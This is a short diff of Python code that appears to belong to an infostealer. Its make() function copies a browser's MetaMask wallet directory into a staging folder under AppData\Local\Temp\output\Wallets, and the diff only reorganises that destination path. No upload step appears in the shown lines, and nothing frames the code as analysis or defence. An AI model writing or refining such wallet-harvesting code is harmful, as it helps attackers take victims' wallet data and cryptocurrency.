@@ -17,7 +17,7 @@ def copy_directory(src, dst):
 
 def make(args, brow):
 
-    dest_path = os.path.join(user, f"AppData\\Local\\Temp\\output\\Wallets\\Metamask_{brow}")
+    dest_path = os.path.join(user, f"AppData\\Local\\Temp\\output\\Wallets\\Metamask\\Metamask_{brow}")
     if os.path.exists(args):
         copy_directory(args, dest_path)
 
